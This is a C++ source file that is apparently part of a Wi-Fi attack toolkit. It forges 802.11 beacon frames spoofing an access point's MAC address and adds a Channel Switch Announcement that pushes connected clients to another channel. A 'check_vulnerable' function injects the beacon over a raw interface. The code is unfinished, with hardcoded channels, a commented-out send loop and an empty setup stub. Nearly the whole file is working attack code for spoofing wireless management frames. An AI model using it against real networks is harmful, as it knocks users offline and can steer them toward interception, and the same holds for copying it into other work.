#include "attacks/channel_switch/channel_switch.h"

using namespace std;
using namespace Tins;
void send_CSA_beacon(const HWAddress<6>& ap_mac, const HWAddress<6>& sta_mac, const NetworkInterface& iface, const string& ssid, int ap_channel){

    Dot11Beacon beacon;
    beacon.addr1(Dot11::BROADCAST);
    beacon.addr2(ap_mac);
    beacon.addr3(ap_mac);
    beacon.ssid(ssid);
    beacon.ds_parameter_set(6);

    Dot11ManagementFrame::channel_switch_type cs;
    cs.switch_mode = 1;
    cs.new_channel = 1; // TODO hardcoded
    cs.switch_count = 3;
    beacon.channel_switch(cs);

    RadioTap radiotap;
    radiotap.channel(2437, RadioTap::OFDM); //TODO hardcoded channel 6
    radiotap.inner_pdu(beacon);

    PacketSender sender;
    sender.send(radiotap, iface);
}
void check_vulnerable(const HWAddress<6>& ap_mac, const HWAddress<6>& sta_mac, const string iface_name, const string& ssid, int ap_channel) {

    NetworkInterface iface(iface_name);
    //TODO for (int i = 0; !g_stop; ++i) {
        send_CSA_beacon(ap_mac, sta_mac, iface, ssid, ap_channel);
    //}

    cout << "check_vulnerable called with:\n"
              << "AP MAC: " << ap_mac << "\n"
              << "STA MAC: " << sta_mac << "\n"
              << "Interface: " << iface_name << "\n"
              << "Channel: " << ap_channel << "\n"
              << "SSID: " << ssid << endl;
}
// ----------------- MODULE functions ------------------
void setup_attack(){
    //TODO

}